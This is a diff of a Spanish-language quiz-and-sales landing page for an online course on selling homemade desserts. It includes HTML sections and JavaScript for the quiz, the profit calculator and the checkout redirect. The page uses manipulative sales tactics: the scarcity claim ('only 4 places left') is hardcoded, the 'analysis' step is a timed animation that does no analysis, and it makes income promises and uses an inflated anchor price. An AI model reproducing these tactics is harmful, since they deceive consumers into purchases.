+          <div class="pv-learning-card"><span>🍰</span><strong>Cheesecakes, Brownies, Cookies y Mucho Más</strong></div>
+          <div class="pv-learning-card"><span>🏠</span><strong>Cómo Empezar tu Negocio desde Casa</strong></div>
+          <div class="pv-learning-card"><span>🧾</span><strong>Planificación Inicial de tu Negocio</strong></div>
+          <div class="pv-learning-card"><span>🛒</span><strong>Materiales e Ingredientes</strong></div>
+          <div class="pv-learning-card"><span>👩‍🍳</span><strong>Producción con Estándar de Calidad</strong></div>
+          <div class="pv-learning-card"><span>💰</span><strong>Costos y Formación de Precios</strong></div>
+          <div class="pv-learning-card"><span>📲</span><strong>Ventas y Promoción</strong></div>
+          <div class="pv-learning-card"><span>📦</span><strong>Pedidos, Entregas y Logística</strong></div>
+          <div class="pv-learning-card"><span>📊</span><strong>Gestión Financiera Simple</strong></div>
+          <div class="pv-learning-card"><span>❤️</span><strong>Fidelización de Clientes</strong></div>
+          <div class="pv-learning-card"><span>🚀</span><strong>Expansión de Ventas</strong></div>
+          <div class="pv-learning-card"><span>💬</span><strong>Soporte por WhatsApp</strong></div>
+          <div class="pv-learning-card"><span>📱</span><strong>Aplicación Exclusiva con Material de Apoyo</strong></div>
+        </div>
+      </section>
+
+      <section class="pv-section pv-desserts-section">
+        <div class="pv-section-title">
+          <span class="pv-title-chip">APRENDE • PREPARA • VENDE</span>
+          <h2>ALGUNOS DE LOS POSTRES QUE PODRÁS APRENDER Y VENDER</h2>
+        </div>
+
+        <div class="pv-marquee" aria-label="Postres del método">
+          <div class="pv-marquee-track">
+            <article class="dessert-card">
+              <div class="dessert-image">
+                <img src="images/postre1.webp" alt="Cheesecake de Fresa"
+                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                <span class="dessert-fallback-emoji">🍓</span>
+              </div>
+            </article>
+            <article class="dessert-card">
+              <div class="dessert-image">
+                <img src="images/postre2.webp" alt="Brownies"
+                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                <span class="dessert-fallback-emoji">🍫</span>
+              </div>
+            </article>
+            <article class="dessert-card">
+              <div class="dessert-image">
+                <img src="images/postre3.webp" alt="Cookies"
+                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                <span class="dessert-fallback-emoji">🍪</span>
+              </div>
+            </article>
+            <article class="dessert-card">
+              <div class="dessert-image">
+                <img src="images/postre4.webp" alt="Mousses"
+                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                <span class="dessert-fallback-emoji">🍨</span>
+              </div>
+            </article>
+            <article class="dessert-card">
+              <div class="dessert-image">
+                <img src="images/postre5.webp" alt="Panna Cotta"
+                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                <span class="dessert-fallback-emoji">🍮</span>
+              </div>
+            </article>
+            <article class="dessert-card">
+              <div class="dessert-image">
+                <img src="images/postre6.webp" alt="Gelatinas Gourmet"
+                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                <span class="dessert-fallback-emoji">✨</span>
+              </div>
+            </article>
+            <article class="dessert-card">
+              <div class="dessert-image">
+                <img src="images/postre7.webp" alt="Tres Chocolates"
+                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                <span class="dessert-fallback-emoji">🍫</span>
+              </div>
+            </article>
+            <article class="dessert-card">
+              <div class="dessert-image">
+                <img src="images/postre1.webp" alt="Cheesecake de Fresa"
+                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                <span class="dessert-fallback-emoji">🍓</span>
+              </div>
+            </article>
+            <article class="dessert-card">
+              <div class="dessert-image">
+                <img src="images/postre2.webp" alt="Brownies"
+                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                <span class="dessert-fallback-emoji">🍫</span>
+              </div>
+            </article>
+            <article class="dessert-card">
+              <div class="dessert-image">
+                <img src="images/postre3.webp" alt="Cookies"
+                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                <span class="dessert-fallback-emoji">🍪</span>
+              </div>
+            </article>
+            <article class="dessert-card">
+              <div class="dessert-image">
+                <img src="images/postre4.webp" alt="Mousses"
+                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                <span class="dessert-fallback-emoji">🍨</span>
+              </div>
+            </article>
+            <article class="dessert-card">
+              <div class="dessert-image">
+                <img src="images/postre5.webp" alt="Panna Cotta"
+                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                <span class="dessert-fallback-emoji">🍮</span>
+              </div>
+            </article>
+            <article class="dessert-card">
+              <div class="dessert-image">
+                <img src="images/postre6.webp" alt="Gelatinas Gourmet"
+                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                <span class="dessert-fallback-emoji">✨</span>
+              </div>
+            </article>
+            <article class="dessert-card">
+              <div class="dessert-image">
+                <img src="images/postre7.webp" alt="Tres Chocolates"
+                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                <span class="dessert-fallback-emoji">🍫</span>
+              </div>
+            </article>
+          </div>
+        </div>
+      </section>
+
+      <section class="pv-section pv-bonus-section">
+        <div class="pv-section-title">
+          <span class="pv-title-chip pv-title-chip-gold">🎁 REGALOS EXCLUSIVOS</span>
+          <h2>Y SI COMIENZAS HOY, TAMBIÉN TE LLEVAS 4 BONOS</h2>
+        </div>
+
+        <div class="pv-bonus-grid">
+          <article class="pv-bonus-card">
+            <div class="bonus-gift">🎁</div>
+            <div class="bonus-content">
+              <div class="bonus-number">BONO 1</div>
+              <h3>Guía de Conservación y Duración de los Postres</h3>
+            </div>
+          </article>
+
+          <article class="pv-bonus-card">
+            <div class="bonus-gift">🎁</div>
+            <div class="bonus-content">
+              <div class="bonus-number">BONO 2</div>
+              <h3>Empaques y Presentación del Producto</h3>
+            </div>
+          </article>
+
+          <article class="pv-bonus-card">
+            <div class="bonus-gift">🎁</div>
+            <div class="bonus-content">
+              <div class="bonus-number">BONO 3</div>
+              <h3>Kits para Fechas Especiales y Ganancias de Hasta 3X</h3>
+            </div>
+          </article>
+
+          <article class="pv-bonus-card">
+            <div class="bonus-gift">🎁</div>
+            <div class="bonus-content">
+              <div class="bonus-number">BONO 4</div>
+              <h3>Receta del Famoso Brigadeiro Brasileño</h3>
+            </div>
+          </article>
+        </div>
+      </section>
+
+      <section class="pv-section">
+        <div class="pv-offer-card">
+          <div class="offer-flame">🔥 OFERTA ESPECIAL PARA TI HOY</div>
+
+          <h2 class="offer-promise">COMIENZA HOY Y GENERA HASTA <span>$7,000 MXN AL MES</span> VENDIENDO POSTRES DESDE CASA</h2>
+
+          <div class="offer-product">MÉTODO POSTRES RENTABLES COMPLETO</div>
+
+          <div class="anchor-card">
+            <span>Valor normal</span>
+            <s>$997 MXN</s>
+          </div>
+
+          <div class="offer-today">HOY POR SOLO</div>
+          <div class="offer-price">$197 <small>MXN</small></div>
+
+          <div class="scarcity-box">
+            <span class="scarcity-dot"></span>
+            <strong>Solo quedan 4 lugares disponibles a este precio</strong>
+          </div>
+
+          <button class="pv-cta checkout-cta">SÍ, QUIERO EMPEZAR AHORA →</button>
+          <div class="offer-micro">🔒 Pago único • Acceso inmediato</div>
+        </div>
+      </section>
+
+      <section class="pv-section">
+        <div class="pv-security-stack">
+          <article class="security-card guarantee-card">
+            <div class="security-icon">🛡️</div>
+            <div>
+              <span>COMPRA SIN RIESGO</span>
+              <h2>30 DÍAS DE GARANTÍA</h2>
+              <p>Prueba el método con tranquilidad. Si no es para ti, solicita tu reembolso dentro del período de garantía.</p>
+            </div>
+          </article>
+
+          <article class="security-card app-card">
+            <div class="security-icon">📱</div>
+            <div>
+              <span>TODO ORGANIZADO PARA TI</span>
+              <h2>APLICACIÓN EXCLUSIVA</h2>
+              <div class="app-mini-list">
+                <b>✓ Video-clases</b>
+                <b>✓ Material de apoyo</b>
+                <b>✓ Acceso desde celular</b>
+                <b>✓ Acceso desde tablet</b>
+                <b>✓ Acceso desde computadora</b>
+                <b>✓ Acceso inmediato por correo</b>
+              </div>
+            </div>
+          </article>
+        </div>
+      </section>
+
+      <section class="pv-section pv-story">
+        <div class="pv-section-title">
+          <span class="pv-title-chip">MI HISTORIA</span>
+          <h2>DE LOS POSTRES A MI PRIMER CARRO</h2>
+        </div>
+
+        <p>Estas mismas recetas y este método me ayudaron a convertir mi cocina en una fuente de ingresos y cumplir uno de mis primeros grandes sueños: <strong>comprarme mi primer carro nuevo.</strong></p>
+
+        <div class="car-photo">
+          <img src="images/carro.webp" alt="Romina Martinez con su primer carro"
+               onerror="this.style.display='none'; this.parentElement.classList.add('car-fallback');" />
+          <div class="car-fallback-content">🚗 <strong>carro.webp</strong></div>
+        </div>
+
+        <div class="story-signature">— Romina Martinez</div>
+      </section>
+
+      <section class="pv-section">
+        <div class="pv-section-title">
+          <span class="pv-title-chip">RESULTADOS REALES</span>
+          <h2>MIRA ESTA ALUMNA QUE EMPEZÓ HACE MENOS DE 2 SEMANAS Y YA ESTÁ RECIBIENDO PEDIDOS...</h2>
+        </div>
+
+        <div class="single-testimonial-wrap">
+          <div class="single-testimonial-card">
+            <img src="images/depo.webp" alt="Testimonio de alumna de Postres Rentables"
+                 onerror="this.style.display='none'; this.parentElement.classList.add('single-testimonial-fallback');" />
+            <div class="single-testimonial-fallback-content">💬</div>
+          </div>
+        </div>
+      </section>
+
+      <section class="pv-section">
+        <div class="pv-offer-card pv-offer-card-alt">
+          <div class="offer-flame">✨ ESTA ES TU OPORTUNIDAD DE COMENZAR</div>
+
+          <h2 class="offer-promise">CONVIERTE TU COCINA EN UNA FUENTE DE INGRESOS Y GENERA HASTA <span>$7,000 MXN AL MES</span></h2>
+
+          <div class="offer-product">MÉTODO POSTRES RENTABLES COMPLETO</div>
+
+          <div class="anchor-card">
+            <span>Valor normal</span>
+            <s>$997 MXN</s>
+          </div>
+
+          <div class="offer-today">HOY POR SOLO</div>
+          <div class="offer-price">$197 <small>MXN</small></div>
+
+          <div class="scarcity-box">
+            <span class="scarcity-dot"></span>
+            <strong>Solo quedan 4 lugares disponibles a este precio</strong>
+          </div>
+
+          <button class="pv-cta checkout-cta">QUIERO MI ACCESO AHORA →</button>
+          <div class="offer-micro">Pago único • Acceso inmediato por correo electrónico</div>
+        </div>
+      </section>
+
+      <section class="pv-section community-section">
+        <div class="community-head">
+          <div class="community-icon">💜</div>
+          <div>
+            <span>COMUNIDAD</span>
+            <h2>POSTRES RENTABLES</h2>
+          </div>
+        </div>
+
+        <div class="recommendation-stat">
+          <strong>98%</strong>
+          <span>de las alumnas indican y recomiendan la comunidad y el curso a sus conocidos y en redes sociales.</span>
+        </div>
+
+        <div class="review-stack">
+          <article class="review-card">
+            <div class="review-user">
+              <div class="review-avatar">M</div>
+              <div><strong>Mariana López</strong><span>@marianalopezmx</span></div>
+            </div>
+            <p>“Recomiendo muchísimo el curso. Quería empezar a vender postres para tener un ingreso extra y aquí encontré justo lo que necesitaba para comenzar.”</p>
+          </article>
+
+          <article class="review-card">
+            <div class="review-user">
+              <div class="review-avatar">F</div>
+              <div><strong>Fernanda Ruiz</strong><span>@fer.ruizpostres</span></div>
+            </div>
+            <p>“Me encantó. Pensaba que esto era solo para personas con experiencia, pero Romina explica todo tan claro que hoy ya veo mis postres como un negocio de verdad.”</p>
+          </article>
+        </div>
+      </section>
+
+      <section class="pv-section expert-final">
+        <div class="expert-final-photo">
+          <img src="images/expert.webp" alt="Romina Martinez, chef de Postres Rentables"
+               onerror="this.style.display='none'; this.parentElement.classList.add('expert-fallback');" />
+          <div class="expert-fallback-content">👩‍🍳</div>
+        </div>
+
+        <div class="expert-final-copy">
+          <span class="pv-title-chip">UN MENSAJE FINAL DE ROMINA</span>
+          <h2>SI LLEGASTE HASTA AQUÍ, YA DISTE EL PRIMER PASO</h2>
+
+          <p>No necesitas experiencia, una cocina perfecta ni rentar un local.</p>
+          <p><strong>Solo necesitas comenzar con la guía correcta.</strong></p>
+          <p>Quiero enseñarte no solamente a preparar postres, sino a convertirlos en una nueva fuente de ingresos desde tu propia cocina.</p>
+
+          <div class="final-promise">EMPIEZA HOY Y CONVIERTE TUS POSTRES EN UNA NUEVA FUENTE DE INGRESOS</div>
+          <div class="final-price">
+            <span>Acceso hoy por</span>
+            <strong>$197 MXN</strong>
+          </div>
+
+          <div class="scarcity-box">
+            <span class="scarcity-dot"></span>
+            <strong>Solo quedan 4 lugares disponibles a este precio</strong>
+          </div>
+
+          <button class="pv-cta checkout-cta">SÍ, QUIERO ENTRAR A POSTRES RENTABLES →</button>
+          <div class="offer-micro">Acceso inmediato • Instrucciones enviadas por correo electrónico</div>
+        </div>
+      </section>
+
+    </section>
+  </main>
+</div>
+
+<script>
+(() => {
+  "use strict";
+
+  /* ==========================================================
+     CONFIGURACIÓN RÁPIDA
+     ========================================================== */
+  const CONFIG = {
+    pricePerUnit: 60,
+    costPerUnit: 25,
+    productPrice: 247,
+    checkoutUrl: "https://pay.digitalgoat.com.br/checkout/cmu1z9gks067z01pwnnnd85u3?offer=DIDV07B"
+  };
+
+  /* ==========================================================
+     ESTADO
+     ========================================================== */
+  const state = {
+    current: "intro",
+    answers: {},
+    calculatorQty: 30
+  };
+
+  const screenOrder = ["intro","q1","q2","q3","q4","q5","calculator","q6","analysis","vsl"];
+  const progressMap = {
+    intro: 0,
+    q1: 12,
+    q2: 25,
+    q3: 38,
+    q4: 52,
+    q5: 66,
+    calculator: 80,
+    q6: 92,
+    analysis: 97,
+    vsl: 100
+  };
+
+  const labels = {
+    intro: "",
+    q1: "Tu objetivo",
+    q2: "Tu experiencia",
+    q3: "Tus preferencias",
+    q4: "Tu principal bloqueo",
+    q5: "Tu disponibilidad",
+    calculator: "Tu potencial",
+    q6: "Último paso",
+    analysis: "Analizando respuestas",
+    vsl: "Tu resultado"
+  };
+
+  const backMap = {
+    q1: "intro",
+    q2: "q1",
+    q3: "q2",
+    q4: "q3",
+    q5: "q4",
+    calculator: "q5",
+    q6: "calculator"
+  };
+
+  const $ = (sel, ctx=document) => ctx.querySelector(sel);
+  const $$ = (sel, ctx=document) => Array.from(ctx.querySelectorAll(sel));
+
+  const progressFill = $("#progressFill");
+  const quizHeader = $("#quizHeader");
+  const headerBack = $("#headerBack");
+
+  function money(n){
+    return "$" + Number(n).toLocaleString("es-MX");
+  }
+
+  function showScreen(name, pushHistory=false){
+    const target = $(`[data-screen="${name}"]`);
+    if(!target) return;
+
+    $$(".screen").forEach(s => s.classList.remove("active"));
+    target.classList.add("active");
+
+    state.current = name;
+
+    if(name === "intro" || name === "vsl"){
+      quizHeader.classList.add("hidden");
+    }else{
+      quizHeader.classList.remove("hidden");
+      progressFill.style.width = `${progressMap[name] ?? 0}%`;
+
+      if(backMap[name]){
+        headerBack.classList.remove("hidden");
+      }else{
+        headerBack.classList.add("hidden");
+      }
+    }
+
+    window.scrollTo({top:0, behavior:"smooth"});
+
+    if(pushHistory){
+      try{
+        history.pushState({screen:name},"",`#${name}`);
+      }catch(e){}
+    }
+  }
+
+  function setupQuestion(questionEl){
+    const questionKey = questionEl.dataset.question;
+    const options = $$(".option", questionEl.parentElement);
+    const section = questionEl.closest(".screen");
+    const screenName = section?.dataset.screen;
+
+    const autoNextMap = {
+      q1: "q2",
+      q2: "q3",
+      q3: "q4",
+      q4: "q5",
+      q5: "calculator"
+    };
+
+    options.forEach(btn => {
+      btn.addEventListener("click", () => {
+        options.forEach(o => o.classList.remove("selected"));
+        btn.classList.add("selected");
+        state.answers[questionKey] = btn.dataset.value;
+
+        if(btn.classList.contains("auto-finish")){
+          setTimeout(() => finishQuiz(), 320);
+          return;
+        }
+
+        const nextScreen = autoNextMap[screenName];
+        if(nextScreen){
+          setTimeout(() => showScreen(nextScreen, true), 280);
+        }
+      });
+    });
+  }
+
+  $$(".options[data-question]").forEach(setupQuestion);
+
+  $("#startBtn").addEventListener("click", () => showScreen("q1", true));
+
+  headerBack.addEventListener("click", () => {
+    const previous = backMap[state.current];
+    if(previous) showScreen(previous, true);
+  });
+
+  /* ==========================================================
+     CALCULADORA
+     ========================================================== */
+  const calcButtons = $$(".calc-choice");
+  const scenarioTitle = $("#scenarioTitle");
+  const weeklyRevenue = $("#weeklyRevenue");
+  const monthlyRevenue = $("#monthlyRevenue");
+  const monthlyMargin = $("#monthlyMargin");
+  const formulaRevenue = $("#formulaRevenue");
+  const formulaMargin = $("#formulaMargin");
+
+  function popNumber(el){
+    el.classList.remove("fade-number");
+    void el.offsetWidth;
+    el.classList.add("fade-number");
+  }
+
+  function renderCalculator(qty){
+    const price = CONFIG.pricePerUnit;
+    const cost = CONFIG.costPerUnit;
+    const unitMargin = price - cost;
+    const weekly = qty * price;
+    const monthly = weekly * 4;
+    const margin = qty * unitMargin * 4;
+
+    state.calculatorQty = qty;
+    state.answers.weekly_qty = qty;
+
+    calcButtons.forEach(b => b.classList.toggle("selected", Number(b.dataset.qty) === qty));
+
+    scenarioTitle.textContent = qty >= 50 ? "50+ postres por semana" : `${qty} postres por semana`;
+    weeklyRevenue.textContent = money(weekly);
+    monthlyRevenue.textContent = money(monthly);
+    monthlyMargin.textContent = money(margin);
+
+    formulaRevenue.textContent = `${qty} × ${money(price)} = ${money(weekly)} por semana → ${money(monthly)} en 4 semanas.`;
+    formulaMargin.textContent = `Con un costo estimado de ${money(cost)} por unidad: ${qty} × ${money(unitMargin)} de margen × 4 = ${money(margin)} MXN.`;
+
+    [weeklyRevenue, monthlyRevenue, monthlyMargin].forEach(popNumber);
+  }
+
+  calcButtons.forEach(btn => {
+    btn.addEventListener("click", () => renderCalculator(Number(btn.dataset.qty)));
+  });
+
+  renderCalculator(30);
+
+  $("#calculatorContinue").addEventListener("click", () => showScreen("q6", true));
+
+  /* ==========================================================
+     PANTALLA DE ANÁLISIS
+     ========================================================== */
+  function finishQuiz(){
+    showScreen("analysis", true);
+
+    const lines = [$("#a1"),$("#a2"),$("#a3")];
+    lines.forEach(l => l.classList.remove("done"));
+
+    setTimeout(() => lines[0].classList.add("done"), 380);
+    setTimeout(() => lines[1].classList.add("done"), 880);
+    setTimeout(() => lines[2].classList.add("done"), 1380);
+    setTimeout(() => showScreen("vsl", true), 1950);
+  }
+
+  /* ==========================================================
+     CHECKOUT + UTMs
+     Mantiene utm_source, utm_campaign, fbclid, etc.
+     ========================================================== */
+  function buildCheckoutUrl(){
+    const raw = CONFIG.checkoutUrl;
+    if(!raw || raw.includes("SEU-CHECKOUT-AQUI")) return null;
+
+    try{
+      const target = new URL(raw, window.location.href);
+      const current = new URL(window.location.href);
+
+      current.searchParams.forEach((value,key) => {
+        if(!target.searchParams.has(key)) target.searchParams.set(key,value);
+      });
+
+      target.searchParams.set("quiz_qty", String(state.calculatorQty || ""));
+      if(state.answers.goal) target.searchParams.set("quiz_goal", state.answers.goal);
+      if(state.answers.blocker) target.searchParams.set("quiz_blocker", state.answers.blocker);
+
+      return target.toString();
+    }catch(e){
+      return raw;
+    }
+  }
+
+  function goToCheckout(){
+    const url = buildCheckoutUrl();
+    if(!url){
+      alert("Configure la URL del checkout en CONFIG.checkoutUrl antes de publicar.");
+      return;
+    }
+    window.location.href = url;
+  }
+
+  $$(".checkout-cta").forEach(btn => {
+    btn.addEventListener("click", goToCheckout);
+  });
+
+  /* ==========================================================
+     NAVEGACIÓN DEL NAVEGADOR
+     ========================================================== */
+  window.addEventListener("popstate", (event) => {
+    const screen = event.state?.screen || location.hash.replace("#","");
+    if(screenOrder.includes(screen)) showScreen(screen, false);
+  });
+
+  const initialHash = location.hash.replace("#","");
+  if(screenOrder.includes(initialHash)){
+    showScreen(initialHash, false);
+  }else{
+    showScreen("intro", false);
+  }
+
+})();
+</script>
+</body>
+</html>
